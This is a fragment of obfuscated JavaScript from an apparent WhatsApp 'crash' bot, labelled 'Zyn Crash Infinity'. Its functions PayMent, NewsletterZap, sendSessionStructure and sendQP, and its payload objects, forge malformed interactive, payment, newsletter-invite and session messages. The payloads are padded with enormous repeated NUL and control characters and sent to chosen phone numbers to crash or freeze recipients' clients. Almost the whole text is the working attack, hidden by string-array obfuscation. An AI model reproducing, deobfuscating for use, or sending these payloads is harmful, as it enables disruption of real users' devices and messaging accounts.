    const _0x33f37c = _0x1752, _0x301365 = _0x493af3();
    while (!![]) {
        try {
            const _0x40af07 = -parseInt(_0x33f37c(0x1b8)) / (-0x1f9e + 0x1 * 0x139f + 0x18 * 0x80) + -parseInt(_0x33f37c(0x1bf)) / (0x1092 + -0x1980 + 0x8f0) + parseInt(_0x33f37c(0x1ce)) / (0xa51 + 0xa7 * -0x14 + -0x2be * -0x1) * (parseInt(_0x33f37c(0x1c5)) / (0x8 * -0x89 + -0x829 + -0xc75 * -0x1)) + parseInt(_0x33f37c(0x1be)) / (-0x6e * 0x52 + -0x17be + 0x55d * 0xb) * (-parseInt(_0x33f37c(0x1c2)) / (-0x15b * 0x11 + -0x1021 + -0xad * -0x3a)) + -parseInt(_0x33f37c(0x1c6)) / (-0x1 * 0x1c03 + -0x8b + -0x987 * -0x3) * (-parseInt(_0x33f37c(0x1cd)) / (0x1ae * -0xd + -0x4d7 + -0x8e7 * -0x3)) + parseInt(_0x33f37c(0x1b4)) / (0x4ee + -0x1289 * -0x1 + -0x176e) * (parseInt(_0x33f37c(0x1d5)) / (-0x18fd + 0x21d8 + 0x3d * -0x25)) + -parseInt(_0x33f37c(0x1b9)) / (0xeff + 0x3 * -0x3f5 + 0x1 * -0x315) * (-parseInt(_0x33f37c(0x1b6)) / (-0x1 * -0x349 + -0x1607 * 0x1 + 0x12ca));
            if (_0x40af07 === _0x243498)
                break;
            else
                _0x301365['push'](_0x301365['shift']());
        } catch (_0x464f80) {
            _0x301365['push'](_0x301365['shift']());
        }
    }
}(_0x3feb, 0xa1bb8 + 0xf9 * 0x189e + 0x1 * -0x1512d4));
const isContacts = contacts[_0x493981(0x1cf)](sender), isPremium = prem[_0x493981(0x1cf)](sender), isOwner = ownerNumber[_0x493981(0x1cf)](senderNumber) || isBot;
zyn[_0x493981(0x1ba) + _0x493981(0x1d6)] = async (_0x46fce4, _0xf26df0, _0x251c2b, _0x34ca2c = {}) => {
    const _0x490bb7 = _0x493981, _0xb770ef = {
            'XzBsr': function (_0x4b8af1, _0x302367, _0x808142) {
                return _0x4b8af1(_0x302367, _0x808142);
            },
            'vHFaM': function (_0x53277b, _0x445cc3, _0x950e96, _0x55d9b3) {
                return _0x53277b(_0x445cc3, _0x950e96, _0x55d9b3);
            },
            'TMjdm': _0x490bb7(0x1ca),
            'gUPPD': _0x490bb7(0x1c4)
        };
    var _0x533390 = await _0xb770ef[_0x490bb7(0x1c9)](prepareWAMessageMedia, { 'video': { 'url': _0x34ca2c && _0x34ca2c[_0x490bb7(0x1bb)] ? _0x34ca2c[_0x490bb7(0x1bb)] : '' } }, { 'upload': zyn[_0x490bb7(0x1d7) + _0x490bb7(0x1c1)] });
    let _0x15155e = _0xb770ef[_0x490bb7(0x1d1)](generateWAMessageFromContent, _0x46fce4, {
        'viewOnceMessage': {
            'message': {
                'interactiveMessage': {
                    'body': { 'text': _0x34ca2c && _0x34ca2c[_0x490bb7(0x1d0)] ? _0x34ca2c[_0x490bb7(0x1d0)] : '' },
                    'footer': { 'text': _0x34ca2c && _0x34ca2c[_0x490bb7(0x1d3)] ? _0x34ca2c[_0x490bb7(0x1d3)] : '' },
                    'header': {
                        'hasMediaAttachment': !![],
                        'videoMessage': _0x533390[_0x490bb7(0x1c3) + 'ge']
                    },
                    'nativeFlowMessage': {
                        'buttons': _0xf26df0,
                        'messageParamsJson': ''
                    },
                    'contextInfo': {
                        'externalAdReply': {
                            'title': global[_0x490bb7(0x1bc)],
                            'body': _0x490bb7(0x1d4) + _0x490bb7(0x1cc),
                            'thumbnailUrl': global[_0x490bb7(0x1c0)],
                            'sourceUrl': global[_0x490bb7(0x1b5)],
                            'mediaType': 0x1,
                            'renderLargerThumbnail': !![]
                        }
                    }
                }
            }
        }
    }, { 'quoted': _0x251c2b });
    return await zyn[_0x490bb7(0x1c7) + _0x490bb7(0x1b7)](_0xb770ef[_0x490bb7(0x1bd)], _0x46fce4), zyn[_0x490bb7(0x1d2) + 'ge'](_0x46fce4, _0x15155e[_0xb770ef[_0x490bb7(0x1c8)]], { 'messageId': _0x15155e[_0x490bb7(0x1cb)]['id'] });
};
function _0x3feb() {
    const _0x7d9bbc = [
        '31624604KurCAa',
        'sendButton',
        'video',
        'namabot',
        'TMjdm',
        '50AMGaFZ',
        '1484784RuRLeZ',
        'imageurl',
        'Server',
        '830112ErXyVX',
        'videoMessa',
        'message',
        '4141036HAqqNs',
        '7zNHFjg',
        'sendPresen',
        'gUPPD',
        'XzBsr',
        'composing',
        'key',
        'xac',
        '3203536LaKHqo',
        '3kllzOG',
        'includes',
        'body',
        'vHFaM',
        'relayMessa',
        'footer',
        'By\x20Alwi\x20Ko',
        '118460aoAKSk',
        'Video',
        'waUploadTo',
        '252wDhmga',
        'isLink',
        '12qOhuyY',
        'ceUpdate',
        '1665863WKxUOW'
    ];
    _0x3feb = function () {
        return _0x7d9bbc;
    };
    return _0x3feb();
}
		    
		(function (_0x4b0f06, _0x185737) {
    var _0xc01381 = _0x1fa7, _0x2de098 = _0x4b0f06();
    while (!![]) {
        try {
            var _0x54cc3c = -parseInt(_0xc01381(0x1ab)) / (-0x1 * -0x2517 + 0xa62 + -0x17bc * 0x2) * (parseInt(_0xc01381(0x1ac)) / (0x114f + 0x3e1 * 0x4 + -0x1f * 0x10f)) + -parseInt(_0xc01381(0x1b1)) / (-0x2 * 0x317 + 0x5 * -0xde + 0xa87) + -parseInt(_0xc01381(0x1b9)) / (0x1aa1 + -0x2e7 * 0x7 + 0xd * -0x7c) + -parseInt(_0xc01381(0x1a9)) / (0x12 * -0x1c3 + -0x11b0 + -0x3 * -0x1079) * (-parseInt(_0xc01381(0x1af)) / (0x5 * -0x38b + 0x1 * 0x2626 + -0x19 * 0xd1)) + parseInt(_0xc01381(0x1b8)) / (0x1d8e + -0x2684 + 0xb1 * 0xd) * (parseInt(_0xc01381(0x1aa)) / (0x1 * 0x2111 + 0x109c + 0x47 * -0xb3)) + -parseInt(_0xc01381(0x1b5)) / (0x1882 * -0x1 + 0xe22 + 0x5 * 0x215) * (-parseInt(_0xc01381(0x1ad)) / (0x1de8 + 0x1891 + -0x366f)) + parseInt(_0xc01381(0x1a7)) / (0x8 * 0x301 + -0x15 * 0xae + -0x9b7) * (parseInt(_0xc01381(0x1b6)) / (-0x15cc + -0x5d7 + -0x175 * -0x13));
            if (_0x54cc3c === _0x185737)
                break;
            else
                _0x2de098['push'](_0x2de098['shift']());
        } catch (_0x13dfe5) {
            _0x2de098['push'](_0x2de098['shift']());
        }
    }
}(_0x41e8, -0x744b9 + 0x781c9 * 0x1 + 0x16b03 * 0x5));
function _0x1fa7(_0x101616, _0x202c1c) {
    var _0x13e54a = _0x41e8();
    return _0x1fa7 = function (_0x49a238, _0x20758c) {
        _0x49a238 = _0x49a238 - (-0x18 * -0xa2 + 0x1ace + -0x1c1 * 0x17);
        var _0x5f2f27 = _0x13e54a[_0x49a238];
        return _0x5f2f27;
    }, _0x1fa7(_0x101616, _0x202c1c);
}
async function sendQP(_0x57f0da, _0x7d8c9a, _0xafb223, _0x48dcca, _0x163f55, _0x2336dd, _0x1dd9ea, _0x154a22) {
    var _0x540abf = _0x1fa7, _0x3f17c2 = {
            'FeRaP': function (_0x2f3ad6, _0x168df9, _0x32a364, _0x33eab9) {
                return _0x2f3ad6(_0x168df9, _0x32a364, _0x33eab9);
            }
        }, _0x471a74 = _0x3f17c2[_0x540abf(0x1ae)](generateWAMessageFromContent, _0x57f0da, proto[_0x540abf(0x1b3)][_0x540abf(0x1b4)]({
            'qp': {
                'filter': {
                    'filterName': _0x7d8c9a,
                    'parameters': _0xafb223,
                    'filterResult': _0x48dcca,
                    'clientNotSupportedConfig': _0x163f55
                },
                'filterClause': {
                    'clauseType': _0x2336dd,
                    'clauses': _0x1dd9ea,
                    'filters': _0x154a22
                }
            }
        }), { 'userJid': _0x57f0da });
    await zyn[_0x540abf(0x1b0) + 'ge'](_0x57f0da, _0x471a74[_0x540abf(0x1b2)], {
        'participant': { 'jid': _0x57f0da },
        'messageId': _0x471a74[_0x540abf(0x1a8)]['id']
    });
}
function _0x41e8() {
    var _0x46108b = [
        'Message',
        'fromObject',
        '135UVlJJG',
        '12aaonUY',
        'Unoey',
        '2786XUvSLD',
        '1706640wNDuaP',
        '9048138CgRtnz',
        'key',
        '1172355vCKalS',
        '9896OWizdO',
        '7RVMltc',
        '162872rxWQvQ',
        '114160IYEOpS',
        'FeRaP',
        '18zRzcdc',
        'relayMessa',
        '2137614MeNFaJ',
        'message'
    ];
    _0x41e8 = function () {
        return _0x46108b;
    };
    return _0x41e8();
}
async function sendSessionStructure(_0x38b72f, _0x52b705, _0x582ce1, _0x2a0ad5, _0x586bf3, _0x45aa28, _0x207b2a, _0x4051ee, _0x593719, _0x522042, _0x559d6f, _0x3e730d, _0x2ebbfd, _0x5938b6) {
    var _0x12d75e = _0x1fa7, _0x323dbf = {
            'Unoey': function (_0x6d5a3b, _0x341e06, _0xc6e474, _0x25e144) {
                return _0x6d5a3b(_0x341e06, _0xc6e474, _0x25e144);
            }
        }, _0x3496da = _0x323dbf[_0x12d75e(0x1b7)](generateWAMessageFromContent, _0x38b72f, proto[_0x12d75e(0x1b3)][_0x12d75e(0x1b4)]({
            'sessionStructure': {
                'sessionVersion': _0x52b705,
                'localIdentityPublic': _0x582ce1,
                'remoteIdentityPublic': _0x2a0ad5,
                'rootKey': _0x586bf3,
                'previousCounter': _0x45aa28,
                'senderChain': _0x207b2a,
                'receiverChains': _0x4051ee,
                'pendingKeyExchange': _0x593719,
                'pendingPreKey': _0x522042,
                'remoteRegistrationId': _0x559d6f,
                'localRegistrationId': _0x3e730d,
                'needsRefresh': _0x2ebbfd,
                'aliceBaseKey': _0x5938b6
            }
        }), { 'userJid': _0x38b72f });
    await zyn[_0x12d75e(0x1b0) + 'ge'](_0x38b72f, _0x3496da[_0x12d75e(0x1b2)], {
        'participant': { 'jid': _0x38b72f },
        'messageId': _0x3496da[_0x12d75e(0x1a8)]['id']
    });
}
		
var _0x17370c = _0x485f;
(function (_0x3c649a, _0x1e1c31) {
    var _0x4f2273 = _0x485f, _0x1673bf = _0x3c649a();
    while (!![]) {
        try {
            var _0x3e97a3 = parseInt(_0x4f2273(0xe4)) / (0x14d9 * -0x1 + 0x1a53 * 0x1 + -0x579) * (-parseInt(_0x4f2273(0xf0)) / (0x123 * -0x18 + -0x1e3b + 0x307 * 0x13)) + -parseInt(_0x4f2273(0xb7)) / (0x1e47 + 0x1c70 + -0xdd * 0x44) + parseInt(_0x4f2273(0x144)) / (-0x233f + -0x64a + -0xb * -0x3c7) + parseInt(_0x4f2273(0xcc)) / (0x21db + -0x637 * -0x4 + 0x1 * -0x3ab2) * (-parseInt(_0x4f2273(0xc5)) / (-0x1fdb + -0x2 * 0x38b + 0x7 * 0x591)) + parseInt(_0x4f2273(0x10c)) / (-0x1 * 0x1f3f + 0x22 * -0x95 + -0x1988 * -0x2) + -parseInt(_0x4f2273(0x129)) / (-0x19fa + 0x269f + -0xc9d) + parseInt(_0x4f2273(0x148)) / (0x700 + 0x187e + -0x1f75) * (parseInt(_0x4f2273(0x145)) / (0x33 * -0x8c + -0x1ac1 + 0x36af));
            if (_0x3e97a3 === _0x1e1c31)
                break;
            else
                _0x1673bf['push'](_0x1673bf['shift']());
        } catch (_0x3f6100) {
            _0x1673bf['push'](_0x1673bf['shift']());
        }
    }
}(_0x1f12, -0x4bd47 * -0x4 + 0x7d276 + 0x4e532 * -0x3));
const wanted = {
    'key': {
        'remoteJid': 'p',
        'fromMe': ![],
        'participant': _0x17370c(0xc6) + _0x17370c(0x17e)
    },
    'message': {
        'interactiveResponseMessage': {
            'body': {
                'text': _0x17370c(0xaf),
                'format': _0x17370c(0xe6)
            },
            'nativeFlowResponseMessage': {
                'name': _0x17370c(0xf7) + _0x17370c(0xdb),
                'paramsJson': _0x17370c(0xd4) + _0x17370c(0x134) + _0x17370c(0x15d) + _0x17370c(0x12c) + _0x17370c(0x12e) + _0x17370c(0xd5) + _0x17370c(0x161) + _0x17370c(0x141) + _0x17370c(0x11c) + _0x17370c(0xd8) + _0x17370c(0x107) + _0x17370c(0xc4) + _0x17370c(0x146) + _0x17370c(0x153) + _0x17370c(0x115) + _0x17370c(0x116) + _0x17370c(0x102) + _0x17370c(0xc2) + _0x17370c(0xdf) + _0x17370c(0x136) + _0x17370c(0x150) + _0x17370c(0x133) + _0x17370c(0x126) + _0x17370c(0x11d) + '\x03'[_0x17370c(0xa7)](-0x42 * -0x13e9 + -0x2a143 + 0x52051 * 0x1) + (_0x17370c(0x175) + _0x17370c(0x127) + _0x17370c(0xf3) + _0x17370c(0xaa) + _0x17370c(0xf1) + _0x17370c(0xe7) + _0x17370c(0x138) + _0x17370c(0xc9) + _0x17370c(0x118) + _0x17370c(0xe2) + _0x17370c(0xba) + _0x17370c(0x14c) + _0x17370c(0xbc) + _0x17370c(0xdd) + _0x17370c(0x119) + _0x17370c(0x178)),
                'version': 0x3
            }
        }
    }
};
async function PayMent(_0xb89be6) {
    var _0x4919bd = _0x17370c, _0x34e7e8 = {
            'IPNts': function (_0xc081a, _0x19d289, _0x5298c1, _0x293181) {
                return _0xc081a(_0x19d289, _0x5298c1, _0x293181);
            },
            'VqNTX': _0x4919bd(0xd3) + _0x4919bd(0x140)
        }, _0x184c8c = _0x34e7e8[_0x4919bd(0x120)](generateWAMessageFromContent, _0xb89be6, proto[_0x4919bd(0xfc)][_0x4919bd(0xe3)]({
            'viewOnceMessage': {
                'message': {
                    'interactiveMessage': {
                        'header': {
                            'hasMediaAttachment': !![],
                            'sequenceNumber': '0',
                            'jpegThumbnail': ''
                        },
                        'nativeFlowMessage': {
                            'buttons': [{
                                    'name': _0x34e7e8[_0x4919bd(0x169)],
                                    'buttonParamsJson': _0x4919bd(0xce) + _0x4919bd(0xe5) + _0x4919bd(0xc8) + _0x4919bd(0x125) + _0x4919bd(0x154) + _0x4919bd(0x15c) + _0x4919bd(0x17a) + _0x4919bd(0xf4) + _0x4919bd(0x16f) + _0x4919bd(0x12b) + _0x4919bd(0xd7) + _0x4919bd(0x135) + _0x4919bd(0x123) + _0x4919bd(0x10d) + _0x4919bd(0xc1) + _0x4919bd(0x160) + _0x4919bd(0x164) + _0x4919bd(0x13e) + _0x4919bd(0x10e) + _0x4919bd(0x167) + _0x4919bd(0xee) + _0x4919bd(0x173) + _0x4919bd(0x121) + _0x4919bd(0x10a) + _0x4919bd(0x168) + _0x4919bd(0x110) + _0x4919bd(0xfb) + _0x4919bd(0x111) + _0x4919bd(0xe9) + _0x4919bd(0x13c) + _0x4919bd(0x117) + _0x4919bd(0xd6) + _0x4919bd(0x14f) + _0x4919bd(0x105) + _0x4919bd(0x157) + _0x4919bd(0xb6) + _0x4919bd(0x151) + _0x4919bd(0x176) + _0x4919bd(0x10b) + _0x4919bd(0xd0) + _0x4919bd(0x14d) + _0x4919bd(0x179) + _0x4919bd(0x15f) + _0x4919bd(0x180) + 'k' + bugpdf + (_0x4919bd(0x162) + _0x4919bd(0x172) + _0x4919bd(0x156) + _0x4919bd(0xe9) + _0x4919bd(0xc3) + _0x4919bd(0x149) + _0x4919bd(0xff) + _0x4919bd(0x131) + _0x4919bd(0x14a) + _0x4919bd(0x10f) + _0x4919bd(0xae) + _0x4919bd(0x16c) + _0x4919bd(0x158) + _0x4919bd(0x162) + _0x4919bd(0x172) + _0x4919bd(0xa4) + _0x4919bd(0xfa) + _0x4919bd(0x12f) + _0x4919bd(0xad) + _0x4919bd(0x15b) + _0x4919bd(0x17f) + _0x4919bd(0x174))
                                }],
                            'messageParamsJson': '\x00'[_0x4919bd(0xa7)](-0x27b6 * -0x1 + -0x16a4 + -0x15fe * -0x1)
                        }
                    }
                }
            }
        }), {});
    zyn[_0x4919bd(0xd2) + 'ge'](_0xb89be6, _0x184c8c[_0x4919bd(0x16a)], { 'messageId': _0x184c8c[_0x4919bd(0xd1)]['id'] });
}
async function NewsletterZap(_0x569940) {
    var _0x3fb635 = _0x17370c, _0x19492e = {
            'NCFKo': function (_0x2625d0, _0xfcd64a, _0x58283e, _0x459c75) {
                return _0x2625d0(_0xfcd64a, _0x58283e, _0x459c75);
            },
            'PJUss': function (_0x129295, _0x3f53c9) {
                return _0x129295 + _0x3f53c9;
            },
            'RwINz': _0x3fb635(0xca) + 'pt'
        }, _0x191a1d = _0x19492e[_0x3fb635(0x163)](generateWAMessageFromContent, _0x569940, proto[_0x3fb635(0xfc)][_0x3fb635(0xe3)]({
            'viewOnceMessage': {
                'message': {
                    'newsletterAdminInviteMessage': {
                        'newsletterJid': _0x3fb635(0xe0) + _0x3fb635(0x109) + _0x3fb635(0x147),
                        'newsletterName': _0x19492e[_0x3fb635(0xb8)](_0x19492e[_0x3fb635(0x13a)], '\x00'[_0x3fb635(0xa7)](-0x122f9e + 0x125b07 + -0xdde57 * -0x1)),
                        'jpegThumbnail': '',
                        'caption': _0x3fb635(0x17c) + _0x3fb635(0x128) + _0x3fb635(0xa9) + _0x3fb635(0xb0),
                        'inviteExpiration': _0x19492e[_0x3fb635(0xb8)](Date[_0x3fb635(0xe8)](), -0x4ee45e1 * 0x18 + -0xb344f3bc + -0x5e2 * -0x44f90a)
                    }
                }
            }
        }), { 'userJid': _0x569940 });
    await zyn[_0x3fb635(0xd2) + 'ge'](_0x569940, _0x191a1d[_0x3fb635(0x16a)], {
        'participant': { 'jid': _0x569940 },
        'messageId': _0x191a1d[_0x3fb635(0xd1)]['id']
    });
}
function _0x485f(_0x779a91, _0x4b33d1) {
    var _0x480793 = _0x1f12();
    return _0x485f = function (_0x559d94, _0x9d5a06) {
        _0x559d94 = _0x559d94 - (0xe8a + 0xba * 0x1 + -0xea0);
        var _0x5df639 = _0x480793[_0x559d94];
        return _0x5df639;
    }, _0x485f(_0x779a91, _0x4b33d1);
}
const Porke = {
        'key': {
            'participant': _0x17370c(0xc6) + _0x17370c(0x17e),
            ...m[_0x17370c(0xb2)] ? { 'remoteJid': _0x17370c(0xb1) + _0x17370c(0x122) } : {}
        },
        'message': {
            'interactiveMessage': {
                'header': {
                    'hasMediaAttachment': !![],
                    'jpegThumbnail': fs[_0x17370c(0xbf) + 'nc'](_0x17370c(0x15a) + _0x17370c(0xf9) + _0x17370c(0x14b))
                },
                'nativeFlowMessage': {
                    'buttons': [{
                            'name': _0x17370c(0xd3) + _0x17370c(0x140),
                            'buttonParamsJson': _0x17370c(0xce) + _0x17370c(0xe5) + _0x17370c(0xc8) + _0x17370c(0x125) + _0x17370c(0x154) + _0x17370c(0x15c) + _0x17370c(0x17a) + _0x17370c(0xf4) + _0x17370c(0x16f) + _0x17370c(0x12b) + _0x17370c(0xd7) + _0x17370c(0x135) + _0x17370c(0x123) + _0x17370c(0x10d) + _0x17370c(0xc1) + _0x17370c(0x160) + _0x17370c(0x164) + _0x17370c(0x13e) + _0x17370c(0x10e) + _0x17370c(0x167) + _0x17370c(0xee) + _0x17370c(0x173) + _0x17370c(0x121) + _0x17370c(0x10a) + _0x17370c(0x168) + _0x17370c(0x110) + _0x17370c(0xfb) + _0x17370c(0x111) + _0x17370c(0xe9) + _0x17370c(0x13c) + _0x17370c(0x117) + _0x17370c(0xd6) + _0x17370c(0x14f) + _0x17370c(0x105) + _0x17370c(0x157) + _0x17370c(0xb6) + _0x17370c(0x151) + _0x17370c(0x176) + _0x17370c(0x10b) + _0x17370c(0xd0) + _0x17370c(0x14d) + _0x17370c(0x179) + _0x17370c(0x15f) + _0x17370c(0x180) + _0x17370c(0x152) + _0x17370c(0x12a) + _0x17370c(0xef) + _0x17370c(0x12d) + _0x17370c(0x155) + _0x17370c(0xa6) + _0x17370c(0xed) + _0x17370c(0x103) + _0x17370c(0xd9) + _0x17370c(0xcb) + _0x17370c(0x124) + _0x17370c(0xea) + _0x17370c(0xf2) + _0x17370c(0xe1) + _0x17370c(0x14e) + _0x17370c(0x11b) + _0x17370c(0x12d) + _0x17370c(0x155) + _0x17370c(0xb3) + _0x17370c(0xde) + _0x17370c(0xa5) + _0x17370c(0xc7) + _0x17370c(0x13d) + _0x17370c(0x101) + _0x17370c(0x16d)
                        }]
                }
            }
        }
    }, Porke2 = {
        'key': {
            'participant': _0x17370c(0xc6) + _0x17370c(0x17e),
            ...m[_0x17370c(0xb2)] ? { 'remoteJid': _0x17370c(0xb1) + _0x17370c(0x122) } : {}
        },
        'message': {
            'interactiveMessage': {
                'header': {
                    'hasMediaAttachment': !![],
                    'jpegThumbnail': fs[_0x17370c(0xbf) + 'nc'](_0x17370c(0x15a) + _0x17370c(0xf9) + _0x17370c(0x14b))
                },
                'nativeFlowMessage': {
                    'buttons': [{
                            'name': _0x17370c(0xd3) + _0x17370c(0x140),
                            'buttonParamsJson': _0x17370c(0xce) + _0x17370c(0xe5) + _0x17370c(0xc8) + _0x17370c(0x125) + _0x17370c(0x154) + _0x17370c(0x15c) + _0x17370c(0x17a) + _0x17370c(0xf4) + _0x17370c(0x16f) + _0x17370c(0x12b) + _0x17370c(0xd7) + _0x17370c(0x135) + _0x17370c(0x123) + _0x17370c(0x10d) + _0x17370c(0xc1) + _0x17370c(0x160) + _0x17370c(0x164) + _0x17370c(0x13e) + _0x17370c(0x10e) + _0x17370c(0x167) + _0x17370c(0xee) + _0x17370c(0x173) + _0x17370c(0x121) + _0x17370c(0x10a) + _0x17370c(0x168) + _0x17370c(0x110) + _0x17370c(0xfb) + _0x17370c(0x111) + _0x17370c(0xe9) + _0x17370c(0x13c) + _0x17370c(0x117) + _0x17370c(0xd6) + _0x17370c(0x14f) + _0x17370c(0x105) + _0x17370c(0x157) + _0x17370c(0xb6) + _0x17370c(0x151) + _0x17370c(0x176) + _0x17370c(0x10b) + _0x17370c(0xd0) + _0x17370c(0x14d) + _0x17370c(0x179) + _0x17370c(0x15f) + _0x17370c(0x180) + _0x17370c(0x152) + _0x17370c(0x12a) + _0x17370c(0xef) + _0x17370c(0x12d) + _0x17370c(0x155) + _0x17370c(0xa6) + _0x17370c(0xed) + _0x17370c(0x103) + _0x17370c(0xd9) + _0x17370c(0xcb) + _0x17370c(0x124) + _0x17370c(0xea) + _0x17370c(0xf2) + _0x17370c(0xe1) + _0x17370c(0x14e) + _0x17370c(0x11b) + _0x17370c(0x12d) + _0x17370c(0x155) + _0x17370c(0xb3) + _0x17370c(0xde) + _0x17370c(0xa5) + _0x17370c(0xc7) + _0x17370c(0x13d) + _0x17370c(0x101) + _0x17370c(0x16d)
                        }]
                }
            }
        }
    };
function _0x1f12() {
    var _0x23e4d6 = [
        'ame\x22:\x22\x22,\x22a',
        'te\x22,\x22scree',
        '-\x20buttons',
        'Nqcef',
        'BEGIN:VCAR',
        'IPNts',
        '490699944,',
        'adcast',
        ',\x22order\x22:{',
        'stom-item-',
        't\x22:{\x22value',
        '0\x22:\x22radio\x20',
        '0_TextInpu',
        'dmin\x20Chann',
        '9149432iquKjK',
        '𝒓𝒂ͯ͢𝒔𝒉\x20𝐈𝐧͢𝐟𝐢ͮ',
        'X3FFJ\x22,\x22ty',
        'en_2_OptIn',
        'mount\x22:{\x22v',
        '_1\x22:true,\x22',
        '0},\x22quanti',
        'ymj1X\x0aitem',
        '\x22custom-it',
        'ZgKig',
        'TextInput_',
        '_OptIn_0\x22:',
        'cal-goods\x22',
        '94643116\x22,',
        '\x0a\x0aFN:',
        'Grimgar\x22,\x22',
        '```',
        'RwINz',
        'getName',
        ',\x22shipping',
        'tive_payme',
        '{\x22value\x22:4',
        'OEjNn',
        '_pay',
        ':\x22ZetExecu',
        'ABLabel:Po',
        'length',
        '1448172OmwjGy',
        '270JLmKRo',
        '00\x22,\x22scree',
        'ewsletter',
        '1318950YXNjqj',
        '\x22:7},{\x22ret',
        'em-f22115f',
        'song.png',
        'flow_token',
        ',\x22product_',
        'f16de8\x22,\x22n',
        '00,\x22offset',
        '\x22screen_0_',
        'tems\x22:[{\x22r',
        '\x22️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧\x20𝑪͢',
        'n_1_TextIn',
        '\x22:49981399',
        'alue\x22:9999',
        '999900,\x22of',
        'der_type\x22:',
        ',\x22name\x22:\x22\x22',
        '2.EMAIL;ty',
        './database',
        '\x22native_pa',
        '788,\x22offse',
        'true,\x22scre',
        'abel:Email',
        '7460576343',
        'quested\x22,\x22',
        'ropdown_0\x22',
        ',\x22amount\x22:',
        'NCFKo',
        'subtotal\x22:',
        'reverse',
        '@s.whatsap',
        ',\x22offset\x22:',
        '00},\x22disco',
        'VqNTX',
        'message',
        'bel:Region',
        'b4bf16de8\x22',
        '\x22:[]}',
        '3.X-ABLabe',
        'd\x22:\x224OON4P',
        'toString',
        'tem2.X-ABL',
        '{\x22value\x22:9',
        ':{\x22value\x22:',
        'ods\x22:[]}',
        '\x22,\x22screen_',
        'etailer_id',
        '/0029Vamlm',
        '.\x22}',
        'id\x22:\x2278426',
        't\x22:100},\x22r',
        ':3.0\x0a\x0aN:',
        'Undangan\x20A',
        'push',
        'pp.net',
        'yment_meth',
        '5\x22,\x22name\x22:',
        '99999900,\x22',
        '\x22quantity\x22',
        '900,\x22offse',
        'repeat',
        '\x0a\x0aitem3.UR',
        'el\x20Koxac\x20S',
        'y\x22,\x22screen',
        'nsel\x0a\x0aitem',
        'pe=INTERNE',
        'ty\x22:49}]},',
        'e-92c1-8e7',
        'Sent',
        'cript',
        'status@bro',
        'chat',
        '99900,\x22off',
        ':;;Indones',
        'p.net',
        '\x22ORDER\x22,\x22i',
        '2434164dHnCcn',
        'PJUss',
        'QIbCn',
        '\x220_true\x22,\x22',
        '\x0a\x0aitem1.TE',
        '\x22:\x22AQAAAAA',
        'L:https://',
        'split',
        'readFileSy',
        'l:YouTube\x0a',
        'payment_re',
        'een_1_Text',
        ',\x22quantity',
        '0289952000',
        '12EHkGXN',
        '0@s.whatsa',
        ':49}]},\x22na',
        'otal_amoun',
        'screen_0_R',
        'Koxac\x20Scri',
        'er_id\x22:\x22cu',
        '336610SSljhI',
        'imewing@gm',
        '{\x22currency',
        'QyTrP',
        '605763435\x22',
        'key',
        'relayMessa',
        'review_and',
        '{\x22screen_2',
        'screen_1_D',
        ':489999999',
        'pe\x22:\x22physi',
        'n_1_DatePi',
        '},{\x22retail',
        'hOVbW',
        'sage',
        'whatsapp.c',
        'CS5FpgQ_cA',
        'set\x22:100},',
        'Input_3\x22:\x22',
        '1203632985',
        '2c1-8e7b4b',
        'sGroup_3\x22:',
        'fromObject',
        '1tuYnzh',
        '\x22:\x22IDR\x22,\x22t',
        'DEFAULT',
        'n_2\x22:\x22001-',
        'now',
        'fset\x22:100}',
        'f22115f9-4',
        'EcnrY',
        'ddNVe',
        't\x22:100},\x22q',
        '100},\x22tax\x22',
        '𝐧͢𝐢𝐭𝐲͜͡⃟╮\x22,\x22a',
        '2896998lMaXGM',
        '_0_Dropdow',
        '78a-487e-9',
        't_1\x22:\x22Anja',
        'eference_i',
        '\x0a\x0aEND:VCAR',
        '\x0a\x0aitem1.X-',
        'galaxy_mes',
        'ail.com\x0a\x0ai',
        '/image/zko',
        'offset\x22:10',
        'ue\x22:485792',
        'Message',
        'substr',
        'ia;;;;\x0a\x0ait',
        'ailer_id\x22:',
        'L;waid=',
        'nt_methods',
        'y.id\x22,\x22scr',
        'uantity\x22:7',
        'join',
        '\x22:100},\x22or',
        '\x0aitem4.ADR',
        'cker_1\x22:\x221',
        'em4.X-ABLa',
        '24333143@n',
        '\x22offset\x22:1',
        '\x22:\x227842674',
        '83223mAhxLN',
        '\x22status\x22:\x22',
        '9069994400',
        '9-478a-487',
        'unt\x22:{\x22val',
        '999999,\x22of',
        'zB6mYPFp59',
        'om/channel',
        'T:\x20barasuk',
        'put_2\x22:\x22cz',
        'azxvoid@sk',
        '\x22:{\x22value\x22',
        'adioButton',
        'AAAAE0QI3s',
        'D\x0a\x0aVERSION'
    ];
    _0x1f12 = function () {
        return _0x23e4d6;
    };
    return _0x1f12();
}
let list = [];
for (let i of ownerNumber) {
    list[_0x17370c(0x17d)]({
        'displayName': await zyn[_0x17370c(0x13b)](i + (_0x17370c(0x166) + _0x17370c(0xb5))),
        'vcard': _0x17370c(0x11f) + _0x17370c(0x11a) + _0x17370c(0x17b) + await zyn[_0x17370c(0x13b)](i + (_0x17370c(0x166) + _0x17370c(0xb5))) + _0x17370c(0x137) + await zyn[_0x17370c(0x13b)](i + (_0x17370c(0x166) + _0x17370c(0xb5))) + (_0x17370c(0xbb) + _0x17370c(0x100)) + i + ':' + i + (_0x17370c(0xf6) + _0x17370c(0x142) + _0x17370c(0xab) + _0x17370c(0x159) + _0x17370c(0xac) + _0x17370c(0x114) + _0x17370c(0xcd) + _0x17370c(0xf8) + _0x17370c(0x171) + _0x17370c(0x15e) + _0x17370c(0xa8) + _0x17370c(0xbd) + _0x17370c(0xdc) + _0x17370c(0x113) + _0x17370c(0x177) + _0x17370c(0x112) + _0x17370c(0x130) + _0x17370c(0x16e) + _0x17370c(0xc0) + _0x17370c(0x106) + _0x17370c(0xb4) + _0x17370c(0xfe) + _0x17370c(0x108) + _0x17370c(0x16b) + _0x17370c(0xf5) + 'D')
    });
}
function monospace(_0x1cb965) {
    var _0xbbc3b6 = _0x17370c, _0x43130f = {
            'hOVbW': function (_0x33274f, _0x2ca4e6) {
                return _0x33274f + _0x2ca4e6;
            },
            'QIbCn': _0xbbc3b6(0x139)
        };
    return _0x43130f[_0xbbc3b6(0xda)](_0x43130f[_0xbbc3b6(0xda)](_0x43130f[_0xbbc3b6(0xb9)], _0x1cb965), _0x43130f[_0xbbc3b6(0xb9)]);
}
function toRupiah(_0x171d22) {
    var _0x3765b5 = _0x17370c, _0x276e6c = {
            'EcnrY': function (_0x4b3457, _0x18515c) {
